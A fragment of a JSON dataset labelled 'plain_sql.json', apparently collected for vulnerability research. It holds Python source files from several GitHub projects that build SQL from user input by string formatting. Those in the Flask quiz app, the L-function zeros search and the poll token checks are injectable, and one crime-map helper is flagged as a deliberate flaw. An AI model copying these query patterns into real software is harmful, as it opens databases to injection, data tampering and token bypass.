        "source": "# coding: utf-8\n\n# 2018 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import fields, models, _, api, exceptions\n\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass State(crapo_automata_mixins.StateObjectMixin, models.Model):\n    \"\"\"\n    A state used in the context of an automaton\n    \"\"\"\n\n    _name = \"crapo.state\"\n    _description = u\"State in a workflow, specific to a given model\"\n    _order = \"sequence, name\"\n\n    name = fields.Char(help=\"State's name\", required=True, translate=True, size=32)\n\n    description = fields.Char(required=False, translate=True, size=256)\n\n    sequence = fields.Integer(\n        default=1, help=\"Sequence gives the order in which states are displayed\"\n    )\n\n    fold = fields.Boolean(\n        string=\"Folded in kanban\",\n        help=(\n            \"This stage is folded in the kanban view \"\n            \"when there are no records in that stage to display.\"\n        ),\n        default=False,\n    )\n\n    @api.multi\n    def write(self, values):\n        \"\"\"\n        Override default method to check if there is a valid default_state\n        \"\"\"\n        if \"default_state\" in values:\n            if values[\"default_state\"]:\n                if len(self) > 1:\n                    raise exceptions.ValidationError(\n                        _(u\"There should only one default state per model\")\n                    )\n                else:\n                    found = self.search(\n                        [\n                            (\"default_state\", \"=\", True),\n                            (\"automaton\", \"=\", self.automaton.id),\n                            (\"id\", \"!=\", self.id),\n                        ]\n                    )\n                    for s in found:\n                        s.write({\"default_state\": False})\n\n        return super(State, self).write(values)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/38710f239ccf44111e54fb8c1c47de2572d96075",
        "file_path": "/crapo_tests/models/crm_stage.py",
        "source": "\"\"\"\n2019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            query = 'SELECT id, name FROM \"%s\" WHERE \"%s\" is NULL' % (\n                self._table,\n                column_name,\n            )\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n\n                query = 'UPDATE \"%s\" SET \"%s\"=%%s WHERE id = %s' % (\n                    self._table,\n                    column_name,\n                    stage[0],\n                )\n                self.env.cr.execute(query, (default_value.id,))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/adc8035ed1ba151fe9307646d0e2589ef9b3cd33",
        "file_path": "/crapo_tests/models/crm_stage.py",
        "source": "\"\"\"\n2019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\",\n                (self._table, column_name),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (self._table, column_name, default_value.id, stage[0]),\n                )\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/8f65275855fa74317d34c00939b5d15bcf637a32",
        "file_path": "/crapo_tests/models/crm_stage.py",
        "source": "\"\"\"\n2019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\nimport logging\n\nfrom odoo import models, api\nfrom psycopg2.sql import Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        \"\"\" Create a new crapo_stage for each crm_stage\n        \"\"\"\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            return super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            tname = Identifier(self._table).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n            cname = Identifier(column_name).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n\n            logging.error(\n                \"MMMMMAIS %s (%s) -> %s\", tname, type(tname), str(tname)\n            )\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\", (tname, cname)\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (tname, cname, default_value.id, stage[0]),\n                )\n        return True\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/ee2f15e316ef7b29e25944dfc24f035b92924cba",
        "file_path": "/crapo_tests/models/crm_stage.py",
        "source": "\"\"\"\n2019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\nimport logging\n\nfrom odoo import models, api\nfrom psycopg2.sql import Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        \"\"\" Create a new crapo_stage for each crm_stage\n        \"\"\"\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            return super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            tname = Identifier(self._table.replace('\"', \"\")).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n            cname = Identifier(column_name.replace('\"', \"\")).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n\n            logging.error(\n                \"MMMMMAIS %s ==> %s (%s) -> %s\",\n                self._table,\n                tname,\n                type(tname),\n                str(tname),\n            )\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\",\n                (self._table, cname),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (self._table, cname, default_value.id, stage[0]),\n                )\n        return True\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LMFDB/lmfdb/blob/f6e18e0e9880338e21330eb00f1ac485f434c8d9",
        "file_path": "/lmfdb/zeros/first/firstzeros.py",
        "source": "import flask\nfrom lmfdb.logger import make_logger\nimport os\nfrom flask import render_template, request, url_for\n\nFirstZeros = flask.Blueprint('first L-function zeros', __name__, template_folder=\"templates\")\nlogger = make_logger(FirstZeros)\n\nimport sqlite3\ndata_location = os.path.expanduser(\"~/data/zeros/\")\n#print data_location\n\n\n@FirstZeros.route(\"/\")\ndef firstzeros():\n    start = request.args.get('start', None, float)\n    end = request.args.get('end', None, float)\n    limit = request.args.get('limit', 100, int)\n    degree = request.args.get('degree', None, int)\n    # signature_r = request.arts.get(\"signature_r\", None, int)\n    # signature_c = request.arts.get(\"signature_c\", None, int)\n    if limit > 1000:\n        limit = 1000\n    if limit < 0:\n        limit = 100\n\n    # return render_template(\"first_zeros.html\", start=start, end=end,\n    # limit=limit, degree=degree, signature_r=signature_r,\n    # signature_c=signature_c)\n    title = \"Search for First Zeros of L-functions\"\n    bread=[(\"L-functions\", url_for(\"l_functions.l_function_top_page\")), (\"First Zeros Search\", \" \"), ]\n    return render_template(\"first_zeros.html\",\n                           start=start, end=end, limit=limit,\n                           degree=degree, title=title, bread=bread)\n\n\n@FirstZeros.route(\"/list\")\ndef list_zeros(start=None,\n               end=None,\n               limit=None,\n               fmt=None,\n               download=None,\n               degree=None):\n               # signature_r = None,\n               # signature_c = None):\n    if start is None:\n        start = request.args.get('start', None, float)\n    if end is None:\n        end = request.args.get('end', None, float)\n    if limit is None:\n        limit = request.args.get('limit', 100, int)\n    if fmt is None:\n        fmt = request.args.get('format', 'plain', str)\n    if download is None:\n        fmt = request.args.get('download', 'no')\n    if degree is None:\n        degree = request.args.get('degree', None, int)\n    # if signature_r is None:\n    #    signature_r = request.arts.get(\"signature_r\", None, int)\n    # if signature_c is None:\n    #    signature_c = request.arts.get(\"signature_c\", None, int)\n    if limit > 1000:\n        limit = 1000\n    if limit < 0:\n        limit = 100\n\n    if start is None and end is None:\n        end = 1000\n\n    limit = int(limit)\n\n    where_clause = 'WHERE 1=1 '\n\n    if end is not None:\n        end = str(end)\n        # fix up rounding errors, otherwise each time you resubmit the page you will lose one line\n        if('.' in end): end = end+'999'\n\n    if start is None:\n        where_clause += ' AND zero <= ' + end\n    elif end is None:\n        start = float(start)\n        where_clause += ' AND zero >= ' + str(start)\n    else:\n        where_clause += ' AND zero >= {} AND zero <= {}'.format(start, end)\n\n    if degree is not None and degree != '':\n        where_clause += ' AND degree = ' + str(degree)\n\n    if end is None:\n        query = 'SELECT * FROM (SELECT * FROM zeros {} ORDER BY zero ASC LIMIT {}) ORDER BY zero DESC'.format(\n            where_clause, limit)\n    else:\n        query = 'SELECT * FROM zeros {} ORDER BY zero DESC LIMIT {}'.format(where_clause, limit)\n\n    #print query\n    c = sqlite3.connect(data_location + 'first_zeros.db').cursor()\n    c.execute(query)\n\n    response = flask.Response((\" \".join([str(x) for x in row]) + \"\\n\" for row in c))\n    response.headers['content-type'] = 'text/plain'\n    if download == \"yes\":\n        response.headers['content-disposition'] = 'attachment; filename=zetazeros'\n    # response = flask.Response( (\"1 %s\\n\" % (str(row[0]),) for row in c) )\n    return response\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/aupasana/amara-quiz/blob/f846ff3753fb008eb511db80a5357611e3b24e47",
        "file_path": "/docker/app.py",
        "source": "from flask import Flask, render_template, request, current_app, g\nfrom indic_transliteration import sanscript\nfrom indic_transliteration.sanscript import SchemeMap, SCHEMES, transliterate\n\nimport random\nimport sqlite3 as sql\nimport re\n\napp = Flask(__name__, static_url_path='', static_folder='static')\n\n@app.route('/')\n\ndef index():\n    all_vargas = ['','','','','','','','','','','','','','','','','','','','','','','','','','']\n    return render_template('index.html', all_vargas=all_vargas)\n\n    # try:\n    #     with sql.connect('amara.db') as con:\n    #         con.row_factory = sql.Row\n    #         cur = con.cursor()\n    #         cur.execute(\"select distinct varga from pada\")\n    #         all_vargas = cur.fetchall();\n    #         return render_template('index.html', all_vargas=all_vargas)\n    # finally:\n    #     con.close()\n\n@app.route('/search')\ndef search():\n\n    limit = 10\n    offset = 0\n\n    user_term = request.args.get('term')\n    page = request.args.get('page')\n    term = user_term\n\n    if not page:\n        page = 1\n\n    offset = limit*(int(page) - 1)\n\n    transliterate_regex = re.compile('.*[a-zA-Z].*')\n    if (transliterate_regex.match(term)):\n        term = transliterate(term, sanscript.ITRANS, sanscript.DEVANAGARI)\n\n    term = term.replace(\"*\", \"%\")\n    term_words = term.split()\n\n    try:\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n\n            if len(term_words) == 1:\n                cur.execute(\"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada like '%s' or artha like '%s' order by id limit %d offset %d;\" % (term, term, limit, offset))\n                rows = cur.fetchall();\n            else:\n                query = \"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada in (%s) order by pada limit 100;\" % ','.join('?' for i in term_words)\n                rows = cur.execute(query, term_words)\n\n            return render_template('search.html', rows=rows, user_term=user_term, term=term, page=page)\n    finally:\n        con.close()\n\n\n@app.route('/sloka')\ndef sloka():\n\n    sloka_number = request.args.get('sloka_number')\n\n    sloka_number_parts = sloka_number.split('.')\n\n    sloka_number_previous = \"%s.%s.%d\" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])-1)\n    sloka_number_next = \"%s.%s.%d\" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])+1)\n\n    try:\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from mula where sloka_number = '%s' order by sloka_line;\" % sloka_number)\n            mula = cur.fetchall();\n\n            cur.execute(\"select * from pada where sloka_number = '%s' order by id;\" % sloka_number)\n            pada = cur.fetchall();\n\n            varga = \"\"\n            if len(pada) > 0:\n                varga = pada[0][\"varga\"]\n\n            return render_template('sloka.html', mula=mula, pada=pada, varga=varga, sloka_number=sloka_number, sloka_number_previous=sloka_number_previous, sloka_number_next=sloka_number_next)\n    finally:\n        con.close()\n\n@app.route('/quiz')\ndef quiz():\n\n    varga = request.args.get('varga')\n\n    try:\n        rows =[]\n\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada.varga = '%s' order by random() limit 1;\" % varga)\n            rows = cur.fetchall();\n\n            artha = rows[0][\"artha\"];\n            cur.execute(\"select pada from pada where varga = '%s' and artha = '%s' order by id\" % (varga, artha));\n            paryaya = cur.fetchall();\n\n            return render_template('quiz.html', rows=rows, paryaya=paryaya, varga=varga)\n    finally:\n        con.close()\n\n@app.route('/varga')\ndef varga():\n\n    varga = request.args.get('varga')\n\n    try:\n        rows =[]\n\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from mula where varga = '%s';\" % varga)\n            # cur.execute(\"select * from mula where sloka_number in (select distinct sloka_number from pada where varga='%s');\" % varga)\n            mula = cur.fetchall();\n\n\n\n            return render_template('varga.html', mula=mula, varga=varga)\n    finally:\n        con.close()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Eficent/ao-odoo/blob/d2311dd53598d151a86089c7d4bf8d8bdfd048af",
        "file_path": "/ao_crm_helpdesk_problem_track/reports/qc_problem_track_report.py",
        "source": "# Copyright 2019 Eficent Business and IT Consulting Services S.L.\n# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import tools\nfrom odoo import api, fields, models\n\n\nclass QCProblemReport(models.Model):\n    _name = \"qc.problem.report\"\n    _description = \"Problem Tracking Report\"\n    _auto = False\n    _rec_name = 'date'\n    _order = 'date desc'\n\n    name = fields.Char('Name', readonly=True)\n    date = fields.Datetime('Helpdesk Create Date', readonly=True)\n    notes = fields.Text('Notes', readonly=True)\n    problem_group_id = fields.Many2one('qc.problem.group', 'Problem Group',\n                                       readonly=True)\n    color = fields.Integer('Color Index', readonly=True)\n    priority = fields.Selection([\n        ('0', 'Normal'),\n        ('1', 'Low'),\n        ('2', 'High'),\n        ('3', 'Very High'),\n    ], 'Rating', readonly=True)\n    stage_id = fields.Many2one('qc.stage', 'Stage', readonly=True)\n    qc_team_id = fields.Many2one('qc.team', 'QC Team', readonly=True)\n    company_id = fields.Many2one('res.company', 'Company', readonly=True)\n    crm_helpdesk_count = fields.Integer('Helpdesk Tickets Count',\n                                        readonly=True)\n\n    def _select(self):\n        select_str = \"\"\"\n             SELECT qcp.id as id,\n                    qcp.name as name,\n                    qcp.notes as notes,\n                    qcp.problem_group_id as problem_group_id,\n                    qcp.color as color,\n                    qcp.priority as priority,\n                    qcp.stage_id as stage_id,\n                    qcp.qc_team_id as qc_team_id,\n                    qcp.company_id as company_id,\n                    count(hpr) as crm_helpdesk_count,\n                    chd.date as date\n        \"\"\"\n        return select_str\n\n    def _from(self):\n        from_str = \"\"\"\n        qc_problem qcp\n            left join helpdesk_problem_rel hpr on hpr.qc_problem_id = qcp.id\n            left join crm_helpdesk chd on chd.id = hpr.crm_helpdesk_id\n        \"\"\"\n        return from_str\n\n    def _group_by(self):\n        group_by_str = \"\"\"\n            GROUP BY\n            qcp.id,\n            chd.date\n        \"\"\"\n        return group_by_str\n\n    @api.model_cr\n    def init(self):\n        tools.drop_view_if_exists(self.env.cr, self._table)\n        self.env.cr.execute(\"\"\"CREATE or REPLACE VIEW %s as (\n            %s\n            FROM ( %s )\n            %s\n            )\"\"\" % (self._table,\n                    self._select(),\n                    self._from(),\n                    self._group_by()))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/FAUSheppy/simple-python-poll/blob/93a009614df15cb882e90e0213c029f2a187a0c2",
        "file_path": "/database.py",
        "source": "import sqlite3\nimport os.path\nfrom cpwrap import CFG\nimport random\nimport string\n\ndef connectDB():\n    conn = sqlite3.connect(CFG(\"dbname\"))\n    return (conn, conn.cursor())\n\ndef closeDB(conn, cursor=None):\n    conn.commit()\n    conn.close()\n\ndef queryAll(cursor, reqString):\n    try:\n        cursor.execute(reqString)\n        ret = cursor.fetchall()\n        if ret:\n            return ret\n    except IndexError:\n        return []\n\ndef queryOne(cursor, reqString):\n    try:\n        cursor.execute(reqString)\n        ret = cursor.fetchone()\n        if ret:\n            return ret[0]\n    except IndexError:\n        return None\n\ndef queryQuestion(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT question from {} WHERE name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    tmp = queryOne(c, req)\n    conn.close()\n    return tmp\n\ndef tokenNeededExternal(poll_name):\n    conn, c = connectDB()\n    tmp = checkTokenNeeded(c, poll_name)\n    conn.close()\n    return tmp\n\ndef markTokenUsedExternal(token, optStr=\"\"):\n    conn, c = connectDB()\n    req = \"UPDATE {} SET \\\"options_selected\\\"='{}' WHERE token='{}'\".format(CFG(\"tokens_table_name\"), \\\n                    optStr, token)\n    c.execute(req)\n    closeDB(conn)\n\ndef init():\n    if os.path.isfile(CFG(\"dbname\")):\n        return\n    conn, c = connectDB()\n    c.execute(\"CREATE TABLE \" + CFG(\"poll_table_name\") + \"(\\\n                    name text,\\\n                    options text,\\\n                    has_tokens integer,\\\n                    show_results integer,\\\n                    question text,\\\n                    multi integer, \\\n                    date text)\"\\\n                    )\n    c.execute(\"CREATE TABLE {}(name_option text, count integer)\".format(CFG(\"options_table_name\")))\n    c.execute(\"CREATE TABLE {}(token text, name text, options_selected text)\".format(CFG(\"tokens_table_name\")))\n    c.execute(\"CREATE TABLE {}(adm_token text, poll_name text)\".format(CFG(\"admintoken_table_name\")))\n    closeDB(conn)\n\ndef checkTokenValid(cursor, token, poll_name):\n    req = \"SELECT name, options_selected from {} where token='{}'\".format(CFG(\"tokens_table_name\"), token)\n    answer = queryAll(cursor, req)\n    return answer and answer[0][0] == poll_name and answer[0][1] == 'NONE'\n\ndef checkAdmTokenValid(poll_name, adm_token):\n    conn, c = connectDB()\n    req = \"SELECT poll_name from {} where adm_token = \\\"{}\\\"\".format(CFG(\"admintoken_table_name\"), adm_token)\n    answer = queryOne(c, req)\n    closeDB(conn)\n    return answer == poll_name\n\ndef isValidAdmToken(adm_token):\n    conn, c = connectDB()\n    req = \"SELECT *  from {} where adm_token='{}'\".format(CFG(\"admintoken_table_name\"), adm_token)\n    answer = bool(queryOne(c, req))\n    closeDB(conn)\n    return answer\n\ndef isValidToken(token):\n    conn, c = connectDB()\n    req = \"SELECT * from {} where token='{}'\".format(CFG(\"tokens_table_name\"), token)\n    answer = bool(queryOne(c, req))\n    closeDB(conn)\n    return answer\n\ndef pollNameFromToken(token):\n    conn, c = connectDB()\n    req = \"SELECT name from {} where token='{}'\".format(CFG(\"tokens_table_name\"), token)\n    answer = queryOne(c, req)\n    if not answer:\n        req = \"SELECT poll_name from {} where adm_token='{}'\".format(CFG(\"admintoken_table_name\"), token)\n        answer = queryOne(c, req)\n    closeDB(conn)\n    return answer\n\n\ndef checkTokenNeeded(cursor, poll_name):\n    req = \"SELECT has_tokens FROM {} WHERE name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    return queryOne(cursor, req) == 1;\n\ndef incrementOption(cursor, poll_name, option):\n    key = poll_name+\"-\"+option\n    req = \"UPDATE {} SET count=count+1 WHERE name_option = '{}';\".format(CFG(\"options_table_name\"), key)\n    cursor.execute(req)\n\ndef isMultiChoice(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT multi FROM {} WHERE name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    ret = queryOne(c, req) == 1\n    closeDB(conn)\n    return ret\n\ndef vote(poll_name, options_string, token_used=\"DUMMY_INVALID_TOKEN\"):\n    conn, c = connectDB()\n\n    # check token\n    token_valid = checkTokenValid(c, token_used, poll_name)\n    if not token_valid and checkTokenNeeded(c, poll_name):\n        raise PermissionError(\"Poll requires valid token.\")\n    markTokenUsedExternal(token_used, options_string)\n\n    # save changes\n    # lambda x: x -> rfl :D\n    options = list(filter(lambda x: x, options_string.split(\",\")))\n    # check if multi-choice\n    if len(options) > 1:\n        if not isMultiChoice(poll_name):\n            raise ValueError(\"multiple options for single choice\")\n\n    for opt in options:\n        incrementOption(c, poll_name, opt)\n\n    closeDB(conn)\n\ndef getOptionCount(c, poll_name, option):\n    key = poll_name + \"-\" + option\n    req = \"SELECT \\\"count\\\" FROM {table} WHERE \\\"name_option\\\" = '{key}'\".format(\n                    table=CFG(\"options_table_name\"),key=key)\n    count = queryOne(c, req)\n    if count == None:\n        raise AssertionError(\"Unknown answer for poll. WTF?\")\n    return count;\n\ndef getResults(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT options from {} where name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    options_str = queryOne(c, req)\n\n    if not options_str:\n        raise LookupError(\"Poll '{}' not found in DB\".format(poll_name))\n\n    total = 0\n    options = options_str.split(\",\")\n    results = dict()\n    for opt in options:\n        count = getOptionCount(c, poll_name, opt)\n        total += int(count)\n        results.update({opt:count})\n\n    conn.close()\n    return (results, total)\n\ndef insertOption(c, poll_name, option):\n    key = poll_name + \"-\" + option\n    count = 0\n    params = (key, count)\n    req = \"INSERT INTO {} VALUES (?, ?)\".format(CFG(\"options_table_name\"))\n    c.execute(req, params)\n\ndef getTokensExternal(poll_name):\n    req = \"SELECT token FROM {} WHERE name='{}'\".format(CFG(\"tokens_table_name\"), poll_name)\n    conn, c = connectDB()\n    tmp = queryAll(c, req)\n    conn.close()\n    return tmp\n\ndef genSingleToken(length=5):\n    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))\n\ndef genTokens(c, poll_name, count=False):\n    if not count:\n        count = CFG(\"default_token_count\")\n\n    tokens = [ genSingleToken() for x in range(0,count) ]\n    for token in tokens:\n        name = poll_name \n        options_selected = \"NONE\"\n        params = (token, name, options_selected)\n        req = \"INSERT INTO {} VALUES (?, ?, ?)\".format(CFG(\"tokens_table_name\"))\n        c.execute(req, params)\n    return tokens\n\ndef genTokensExternal(poll_name, count=False):\n    conn, c = connectDB()\n    tok = genTokens(c, poll_name, count)\n    closeDB(conn)\n    return tok\n\ndef createAdminToken(c, poll_name):\n    adm_token = genSingleToken()\n    params = (adm_token, poll_name)\n    req = \"INSERT INTO {} VALUES (?, ?)\".format(CFG(\"admintoken_table_name\"))\n    c.execute(req, params)\n\ndef getAdmToken(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT adm_token FROM {} WHERE poll_name='{}'\".format(CFG(\"admintoken_table_name\"), poll_name)\n    admtok = queryOne(c, req)\n    closeDB(conn)\n    return admtok\n\ndef checkPollExists(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT EXISTS( SELECT 1 FROM {} WHERE name='{}')\".format(CFG(\"poll_table_name\"), poll_name)\n    tmp = queryOne(c, req)\n    conn.close()\n    return tmp\n\ndef createPoll(poll_name, options_arr, question, has_tokens, multi, openresults=True):\n    if checkPollExists(poll_name):\n        raise RuntimeError(\"Cannot create poll, because the poll already exists.\")\n    conn, c = connectDB()\n\n    # actual poll\n    name = poll_name\n    options = \",\".join(options_arr)\n    date = \"NONE\"\n    show_results = openresults\n    params = (name, options, has_tokens, show_results, question, multi, date) \n    req = \"INSERT INTO {} VALUES (?,?,?,?,?,?,?)\".format(CFG(\"poll_table_name\"))\n    c.execute(req, params)\n\n    # tokens if needed\n    tokens = []\n    if has_tokens:\n        tokens = genTokens(c, poll_name)\n\n    # adminAccessToken\n    createAdminToken(c, poll_name)\n\n    # update options\n    for opt in options_arr:\n        insertOption(c, poll_name, opt)\n    \n    closeDB(conn)\n    return tokens\n\ndef getOptions(poll_name):\n    conn, c = connectDB()\n    options_str = queryOne(c, \"SELECT options FROM {} WHERE name='{}'\".format(CFG(\"poll_table_name\"), poll_name))\n    if options_str == None:\n        return None\n    options = options_str.split(\",\")\n    closeDB(conn)\n    return options\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/alejochg/crimemap/blob/ce763299b8b197f0d133fdbf1af95c31377bae4d",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\n\nclass DBHelper:\n\n    def connect(self, database='crimemap'):\n        return pymysql.connect(host='localhost',\n                                user=dbconfig.db_user,\n                                password=dbconfig.db_password,\n                                db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # The following introduces a deliberate security flaw\n            # See section on SQL injection below\n            query = \"INSERT INTO crimes (description) VALUES \\\n                    ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n        \n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()",
        "dataset": "plain_sql.json"
    },
    {
